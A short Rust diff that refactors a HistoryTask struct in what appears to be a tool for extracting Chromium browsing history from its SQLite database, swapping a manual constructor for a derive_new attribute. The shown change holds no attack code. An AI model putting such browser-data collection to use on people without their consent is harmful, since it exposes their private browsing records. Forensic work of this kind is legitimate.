@@ -2,6 +2,7 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
 use crate::{History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all, Extract};
 use alloc::sync::Arc;
+use derive_new::new;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use filesystem::FileSystem;
@@ -14,14 +15,9 @@ const URLS_URL: usize = 1;
 const URLS_TITLE: usize = 2;
 const URLS_LAST_VISIT_TIME: usize = 5;
 
+#[derive(new)]
 pub(super) struct HistoryTask {
     browser: Arc<BrowserData>,
-}
-
-impl HistoryTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for HistoryTask {
